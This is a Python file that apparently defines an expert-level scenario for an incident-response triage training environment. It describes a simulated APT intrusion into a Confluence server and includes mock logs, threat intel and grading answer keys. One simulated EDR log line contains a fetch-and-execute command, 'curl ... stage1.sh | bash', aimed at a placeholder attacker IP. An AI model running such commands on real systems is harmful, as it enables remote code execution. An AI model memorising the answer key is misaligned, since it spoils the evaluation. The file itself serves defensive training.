# Copyright (c) 2026 - OpenEnv Hackathon Submission
# Incident Response Triage Environment - Expert: APT Zero-Day
# BSD-3-Clause License

"""
Task 6: EXPERT - APT with Zero-Day Exploitation

Advanced Persistent Threat (APT group 'Midnight Storm') exploits a zero-day
in Confluence Server to gain initial access. Custom memory-resident implant,
living-off-the-land techniques, DCSync credential theft, Golden Ticket
creation, and covert C2 via DNS tunneling. 7-day dwell time before detection.
"""

try:
    from ..models import ContainmentAction, Severity, ThreatCategory
    from .base import EndpointInfo, LogEntry, Scenario, ThreatIntelEntry, UserProfile
except ImportError:
    from models import ContainmentAction, Severity, ThreatCategory
    from tasks.base import EndpointInfo, LogEntry, Scenario, ThreatIntelEntry, UserProfile


SCENARIO_EXPERT_APT_ZERODAY = Scenario(
    scenario_id="apt_zeroday_001",
    task_id="expert",
    difficulty="expert",
    alert_summary=(
        "ALERT [NDR-5567]: Network Detection & Response system flagged anomalous DNS "
        "traffic pattern from CONF-SRV-01 (Confluence Server). Analysis shows DNS TXT "
        "queries to random subdomains of ns1.weather-analytics.net at regular 30-second "
        "intervals with encoded payloads in query names. Pattern consistent with DNS "
        "tunneling for covert command & control. Investigation reveals Confluence Server "
        "may have been exploited via unpatched vulnerability."
    ),
    alert_source="Network Detection & Response (Darktrace)",
    alert_timestamp="2026-03-25T16:00:00Z",
    initial_observation=(
        "NDR system detected a DNS tunneling pattern from an internal Confluence server. "
        "DNS TXT queries to random subdomains at regular 30-second intervals with encoded "
        "payloads suggest covert C2 communication. The Confluence server is public-facing "
        "and may have been exploited via a zero-day vulnerability. Initial analysis "
        "suggests this may be an Advanced Persistent Threat with extended dwell time. "
        "Thorough investigation is critical to determine the full scope of compromise."
    ),
    true_severity=Severity.CRITICAL,
    true_category=ThreatCategory.APT_ZERO_DAY,
    required_containment=[
        ContainmentAction.ISOLATE_HOST,
        ContainmentAction.ISOLATE_HOST,
        ContainmentAction.BLOCK_IP,
        ContainmentAction.DISABLE_ACCOUNT,
        ContainmentAction.REVOKE_SESSIONS,
        ContainmentAction.DISABLE_ACCOUNT,
    ],
    containment_targets={
        "isolate_host": "CONF-SRV-01",
        "block_ip": "203.0.113.42",
        "disable_account": "dadmin",
        "revoke_sessions": "dadmin",
    },
    # Expert scenario accepts any of these escalation targets
    correct_escalation="tier3",
    max_steps=35,
    # Multi-target containment pairs
    required_containment_pairs=[
        ("isolate_host", "CONF-SRV-01"),
        ("isolate_host", "EXCH-SRV-01"),
        ("block_ip", "203.0.113.42"),
        ("disable_account", "dadmin"),
        ("revoke_sessions", "dadmin"),
        ("disable_account", "svc_confluence"),
    ],
    log_entries=[
        LogEntry(
            source="dns",
            content=(
                "[Over 7 days: 2026-03-18 to 2026-03-25] DNS_TUNNELING: "
                "Client=CONF-SRV-01(10.1.5.20) "
                "Pattern: DNS TXT queries to *.weather-analytics.net every 30 seconds. "
                "Example queries: "
                "  a3f2c8.data.weather-analytics.net (TXT) "
                "  b7d1e4.data.weather-analytics.net (TXT) "
                "  c9a5f0.cmd.weather-analytics.net (TXT) "
                "Encoded data in subdomain labels. ~2,880 queries/day × 7 days = ~20,160 total. "
                "Domain weather-analytics.net registered 30 days ago. "
                "Authoritative NS points to attacker-controlled infrastructure. "
                "Estimated data exfiltrated via DNS: ~500MB over 7 days. "
                "Tactic=COMMAND_AND_CONTROL(T1071.004) "
                "NOTE: DNS tunneling is extremely difficult to detect — low bandwidth "
                "but highly covert. Consistent 30-second beacon interval indicates "
                "automated C2 implant, not manual."
            ),
            is_critical=True,
            keywords=["dns", "dns_tunneling_c2", "dns_tunneling", "c2", "covert", "beacon"],
        ),
        LogEntry(
            source="edr",
            content=(
                "[Day 1: 2026-03-18 09:15:00Z] PROCESS_CREATE: Host=CONF-SRV-01 "
                "Parent=java (Confluence) -> Child=curl CmdLine='curl -s http://203.0.113.42/stage1.sh | bash' "
                "NOTE: Confluence Java process spawning shell command — OGNL injection exploit. "
                "CVE-2026-XXXX: Zero-day OGNL injection in Confluence Server 8.5.4. "
                "No patch available at time of exploitation. "
                "Tactic=INITIAL_ACCESS(T1190) "
                "[Day 1: 09:15:30Z] PROCESS_CREATE: Host=CONF-SRV-01 "
                "Process=python3 -c 'import base64; exec(base64.b64decode(...))' "
                "NOTE: Memory-only implant loaded via Python reflection. "
                "NO FILES WRITTEN TO DISK — fileless attack. "
                "Implant establishes DNS tunneling C2 channel. "
                "Tactic=EXECUTION(T1059.006) "
                "[Day 1: 09:20:00Z] WMI_QUERY: Host=CONF-SRV-01 "
                "Query='SELECT * FROM Win32_ComputerSystem' "
                "Query='SELECT * FROM Win32_OperatingSystem' "
                "NOTE: Domain enumeration via WMI from Confluence server — "
                "Confluence should NOT be making WMI queries. "
                "Tactic=DISCOVERY(T1082)"
            ),
            is_critical=True,
            keywords=["edr", "zero_day_confluence_exploit", "zero_day", "confluence", "fileless_implant", "fileless", "curl", "python"],
        ),
        LogEntry(
            source="edr",
            content=(
                "[Day 3: 2026-03-20 02:30:00Z] DCSYNC_DETECTED: "
                "Source=CONF-SRV-01(10.1.5.20) Target=DC-PRIMARY-01(10.1.1.10) "
                "Operation=DsGetNCChanges (Directory Replication) "
                "Accounts_Replicated: krbtgt, dadmin, svc_exchange, svc_backup "
                "NOTE: DCSync attack — replication request from NON-DC host. "
                "CONF-SRV-01 is a Confluence server, NOT a Domain Controller. "
                "DCSync from a non-DC host is NEVER legitimate. "
                "Attacker now has NTLM hashes for krbtgt and all Domain Admins. "
                "Tactic=CREDENTIAL_ACCESS(T1003.006) "
                "[Day 5: 2026-03-22 14:00:00Z] KERBEROS_ANOMALY: "
                "TGT issued for dadmin with abnormally long lifetime (10 years). "
                "Normal TGT lifetime: 10 hours. "
                "NOTE: Golden Ticket detected — forged using stolen krbtgt hash. "
                "Grants UNLIMITED domain access. Attacker has full domain compromise. "
                "Tactic=PERSISTENCE(T1558.001)"
            ),
            is_critical=True,
            keywords=["edr", "dcsync_credential_theft", "dcsync", "golden_ticket", "golden_ticket_usage", "credential", "kerberos"],
        ),
        LogEntry(
            source="auth",
            content=(
                "[Day 1: 2026-03-18] NORMAL: svc_confluence login to CONF-SRV-01 "
                "via service startup. Standard Confluence service account activity. "
                "[Day 3: 2026-03-20 02:25:00Z] ANOMALOUS: svc_confluence performing "
                "LDAP queries to DC-PRIMARY-01: "
                "  '(&(objectClass=user)(adminCount=1))' "
                "  '(&(objectClass=group)(cn=Domain Admins))' "
                "NOTE: Confluence service account should NOT query Domain Admin "
                "group membership. Indicates attacker using svc_confluence context "
                "for reconnaissance. "
                "[Day 5: 2026-03-22 14:05:00Z] LATERAL_MOVEMENT: dadmin account "
                "used from CONF-SRV-01 to access: "
                "  EXCH-SRV-01(10.1.5.30):443 — Exchange Server admin access "
                "  HR-SRV-01(10.1.5.40):445 — HR file server "
                "NOTE: dadmin DCSync'd on Day 3 — this is the compromised "
                "Domain Admin being used for lateral movement. "
                "Tactic=LATERAL_MOVEMENT(T1021.002)"
            ),
            is_critical=True,
            keywords=["auth", "lateral_movement_exchange", "lateral_movement_hr", "ldap", "lateral_movement", "dadmin", "svc_confluence"],
        ),
        LogEntry(
            source="proxy",
            content=(
                "[Day 1-7] PROXY_NOTE: No unusual HTTP/HTTPS traffic from CONF-SRV-01 "
                "to external IPs. Attacker uses DNS tunneling exclusively for C2 — "
                "bypasses all web proxy monitoring. "
                "[Day 1: 2026-03-18 09:14:55Z] INBOUND: External IP 203.0.113.42 "
                "connected to CONF-SRV-01:8090 (Confluence web interface). "
                "Request: POST /rest/api/content/ with OGNL injection payload "
                "in 'title' parameter. "
                "NOTE: This is the zero-day exploit request. "
                "CONF-SRV-01 is public-facing on port 8090 for external collaboration."
            ),
            is_critical=True,
            keywords=["proxy", "zero_day", "exploit", "confluence", "inbound"],
        ),
        LogEntry(
            source="firewall",
            content=(
                "[Day 1: 2026-03-18 09:14:50Z] ALLOW: Src=203.0.113.42 "
                "Dst=CONF-SRV-01(10.1.5.20) Port=8090 Proto=TCP "
                "Rule=Confluence-Public-Access "
                "NOTE: Public-facing Confluence server allows inbound on 8090. "
                "[Day 3-7] INTERNAL_ANOMALY: CONF-SRV-01(10.1.5.20) → "
                "DC-PRIMARY-01(10.1.1.10):389,88 (LDAP/Kerberos) "
                "NOTE: Confluence server making LDAP and Kerberos requests to "
                "Domain Controller is UNEXPECTED. Normal Confluence auth uses "
                "a single LDAP bind, not replication protocols. "
                "[Day 5-7] INTERNAL_ANOMALY: CONF-SRV-01 → "
                "EXCH-SRV-01(10.1.5.30):443, HR-SRV-01(10.1.5.40):445 "
                "NOTE: Lateral movement from Confluence to Exchange and HR servers."
            ),
            is_critical=True,
            keywords=["firewall", "inbound", "lateral_movement", "internal", "anomalous"],
        ),
        LogEntry(
            source="email",
            content=(
                "[Day 6: 2026-03-23 16:00:00Z] EXCHANGE_AUDIT: "
                "User=dadmin (via compromised credentials) "
                "Action=MailboxExport "
                "Mailboxes_Accessed: CEO, CFO, VP_Engineering "
                "Total_Data: 2.3GB of emails downloaded "
                "Export_Method: EWS API (Exchange Web Services) "
                "NOTE: Attacker accessed executive mailboxes using "
                "compromised Domain Admin 'dadmin' credentials obtained via DCSync. "
                "2.3GB of executive communications exfiltrated. "
                "Data likely exfiltrated via DNS tunneling C2 channel. "
                "Tactic=COLLECTION(T1114.002) "
                "NOTE: Email exfiltration of CEO/CFO/VP comms = severe "
                "corporate espionage. Legal and compliance notification required."
            ),
            is_critical=True,
            keywords=["email", "email_exfiltration", "exchange", "executive", "exfiltration", "dadmin"],
        ),
    ],
    threat_intel=[
        ThreatIntelEntry(
            ioc="203.0.113.42",
            ioc_type="ip",
            description=(
                "No prior threat intelligence entries. First-seen IP address. "
                "GeoIP: Netherlands. Hosted on VPS provider (LeaseWeb). "
                "Clean on AbuseIPDB (0 reports — new, stealthy APT infrastructure). "
                "NOTE: Absence of TI data is characteristic of APT operations — "
                "they use fresh, clean infrastructure to avoid detection."
            ),
            severity="high",
            source="GeoIP / AbuseIPDB / Shodan",
            keywords=["203.0.113.42", "ip", "apt", "clean", "vps"],
        ),
        ThreatIntelEntry(
            ioc="weather-analytics.net",
            ioc_type="domain",
            description=(
                "DNS tunneling C2 domain. Registered 30 days ago. "
                "Privacy-protected WHOIS. Hosted on bulletproof infrastructure. "
                "Authoritative NS: ns1.apt-infra.net (also attacker-controlled). "
                "DNS tunneling pattern: encoded data in subdomain labels, "
                "TXT record responses for C2 commands. "
                "APT group 'Midnight Storm' has used similar DNS tunneling "
                "infrastructure in 3 other attacks on tech companies in past 6 months."
            ),
            severity="critical",
            source="PassiveTotal / DomainTools / APT Attribution DB",
            keywords=["weather-analytics.net", "domain", "dns_tunneling", "c2", "apt", "midnight_storm"],
        ),
        ThreatIntelEntry(
            ioc="svc_confluence",
            ioc_type="account",
            description=(
                "Confluence service account compromised via zero-day exploit. "
                "Account used as initial foothold for domain reconnaissance "
                "and DCSync credential theft. Service accounts with excessive "
                "privileges are common APT targets."
            ),
            severity="high",
            source="Internal Investigation",
            keywords=["svc_confluence", "account", "service_account", "compromised"],
        ),
    ],
    endpoints=[
        EndpointInfo(
            endpoint_id="EP-CONF01",
            hostname="CONF-SRV-01",
            os="Ubuntu 22.04 LTS (Confluence Server 8.5.4)",
            ip="10.1.5.20",
            status="ONLINE - COMPROMISED - MEMORY-RESIDENT IMPLANT ACTIVE",
            processes=[
                "java (Confluence) -> curl (initial exploit) [Day 1]",
                "python3 (memory-only implant - NO DISK IOC) [ACTIVE]",
                "DNS tunneling beacon every 30s to *.weather-analytics.net",
                "NOTE: Fileless — no malicious files on disk. Implant lives "
                "entirely in memory via Java reflection + Python exec.",
            ],
            connections=[
                "DNS TXT to *.weather-analytics.net (C2 - ACTIVE)",
                "LDAP/Kerberos to DC-PRIMARY-01 (DCSync - Day 3)",
                "HTTPS to EXCH-SRV-01 (lateral movement - Day 5)",
                "SMB to HR-SRV-01 (lateral movement - Day 5)",
                "Inbound from 203.0.113.42:8090 (initial exploit - Day 1)",
            ],
            files_modified=[
                "NO MALICIOUS FILES ON DISK — fileless attack",
                "/var/atlassian/confluence/logs/atlassian-confluence.log "
                "(contains OGNL injection traces in request logs)",
            ],
            is_compromised=True,
        ),
        EndpointInfo(
            endpoint_id="EP-DC01",
            hostname="DC-PRIMARY-01",
            os="Windows Server 2022 (Primary Domain Controller)",
            ip="10.1.1.10",
            status="ONLINE - CRITICAL - DCSYNC TARGET / GOLDEN TICKET FORGED",
            processes=[
                "Normal DC processes",
                "NOTE: krbtgt hash compromised via DCSync from CONF-SRV-01",
                "Golden Ticket with 10-year lifetime issued for dadmin",
            ],
            connections=[
                "DCSync replication from CONF-SRV-01 (ANOMALOUS)",
            ],
            files_modified=[],
            is_compromised=True,
        ),
        EndpointInfo(
            endpoint_id="EP-EXCH01",
            hostname="EXCH-SRV-01",
            os="Windows Server 2022 (Exchange Server 2019)",
            ip="10.1.5.30",
            status="ONLINE - COMPROMISED - MAILBOX EXFILTRATION DETECTED",
            processes=[
                "MSExchangeServiceHost.exe (normal)",
                "EWS API sessions from dadmin (UNAUTHORIZED - compromised creds)",
            ],
            connections=[
                "Inbound from CONF-SRV-01 via dadmin credentials",
                "2.3GB mailbox data exported via EWS",
            ],
            files_modified=[
                "Exchange audit logs show mailbox access for CEO, CFO, VP Engineering",
            ],
            is_compromised=True,
        ),
        EndpointInfo(
            endpoint_id="EP-HR01",
            hostname="HR-SRV-01",
            os="Windows Server 2022",
            ip="10.1.5.40",
            status="ONLINE - ACCESSED VIA COMPROMISED CREDENTIALS",
            processes=["Normal file server processes"],
            connections=[
                "SMB from CONF-SRV-01 via dadmin credentials",
            ],
            files_modified=[
                "HR data files accessed (employee records, compensation data)",
            ],
            is_compromised=True,
        ),
    ],
    users=[
        UserProfile(
            user_id="svc_confluence",
            display_name="Confluence Service Account",
            department="IT - Applications",
            role="Service Account - Confluence Server",
            recent_logins=[
                "2026-03-25 - CONF-SRV-01 (service startup - normal)",
                "2026-03-20 02:25 - LDAP queries to DC (ANOMALOUS)",
                "2026-03-18 - CONF-SRV-01 (service startup - normal)",
            ],
            risk_score=0.85,
            notes=(
                "Confluence service account. Should only perform standard "
                "LDAP authentication binds. LDAP queries for Domain Admin "
                "groups and DCSync operations are NOT legitimate for this "
                "account. Compromised via zero-day exploit on Day 1."
            ),
        ),
        UserProfile(
            user_id="dadmin",
            display_name="Domain Administrator",
            department="IT Infrastructure",
            role="Domain Admin",
            recent_logins=[
                "2026-03-22 14:05 - From CONF-SRV-01 [ANOMALOUS - should be from admin workstation]",
                "2026-03-23 16:00 - Exchange mailbox access [ANOMALOUS]",
                "2026-03-21 09:00 - ADMIN-WS-01 (Normal)",
            ],
            risk_score=0.95,
            notes=(
                "Domain Admin account compromised via DCSync on Day 3. "
                "NTLM hash stolen and used to forge Golden Ticket on Day 5. "
                "Attacker used dadmin credentials for lateral movement to "
                "Exchange (email exfiltration) and HR server. "
                "Account should be disabled immediately and krbtgt password "
                "reset TWICE to invalidate Golden Tickets."
            ),
        ),
    ],
    correlation_findings=[
        (
            "CORRELATION: DNS tunneling from CONF-SRV-01 has been active for 7 days "
            "(March 18-25). ~2,880 queries/day to *.weather-analytics.net with "
            "encoded payloads. Estimated 500MB of data exfiltrated via DNS channel. "
            "This is the primary C2 and exfiltration channel — no HTTP-based C2 detected."
        ),
        (
            "CORRELATION: DCSync from CONF-SRV-01 (non-DC host) to DC-PRIMARY-01 "
            "is NEVER legitimate. The svc_confluence account performed directory "
            "replication requests to extract krbtgt and Domain Admin hashes. "
            "This gives the attacker complete domain compromise capability. "
            "Golden Ticket (10-year TGT) detected for dadmin — grants unlimited access."
        ),
        (
            "CORRELATION: APT group 'Midnight Storm' attribution: "
            "1) DNS tunneling infrastructure pattern matches 3 other attacks in past 6 months. "
            "2) Same C2 domain naming convention (*-analytics.net). "
            "3) Same zero-day exploitation of Confluence OGNL injection. "
            "4) Same fileless implant technique (Python exec in Java process). "
            "5) Same target profile (tech companies with valuable IP). "
            "High-confidence attribution to Midnight Storm APT group."
        ),
    ],
    critical_evidence={
        "dns_tunneling_c2",
        "zero_day_confluence_exploit",
        "fileless_implant",
        "dcsync_credential_theft",
        "golden_ticket_usage",
        "email_exfiltration",
        "lateral_movement_exchange",
        "lateral_movement_hr",
    },
    critical_iocs={
        "203.0.113.42",
        "weather-analytics.net",
        "svc_confluence",
        "dadmin",
    },
    report_keywords=[
        "apt", "zero_day", "confluence", "dns_tunneling", "dcsync",
        "golden_ticket", "fileless", "lateral_movement", "exchange",
        "exfiltration", "critical",
    ],
)

TASK_DEFINITION = {
    "name": "APT Zero-Day Exploitation",
    "description": (
        "Investigate an Advanced Persistent Threat with 7-day dwell time. "
        "An APT group exploited a zero-day in Confluence Server, deployed a "
        "fileless memory-resident implant, used DNS tunneling for C2, performed "
        "DCSync to steal domain credentials, forged Golden Tickets, and "
        "exfiltrated executive emails. Requires deep forensic analysis across "
        "all evidence sources to map the full kill chain."
    ),
    "difficulty": "expert",
    "expected_steps": "20-30",
    "key_skills": "APT analysis, DNS tunneling detection, DCSync/Golden Ticket forensics, kill chain reconstruction",
}
